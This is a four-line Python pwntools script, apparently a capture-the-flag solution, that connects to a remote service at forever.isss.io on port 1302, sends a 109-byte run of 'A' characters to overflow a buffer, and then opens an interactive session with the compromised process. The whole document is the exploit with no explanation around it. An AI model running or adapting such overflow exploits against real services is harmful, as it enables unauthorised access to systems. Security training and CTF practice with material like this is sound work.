from pwn import *
p = remote('forever.isss.io', 1302)
p.sendline("A"*109)
p.interactive()
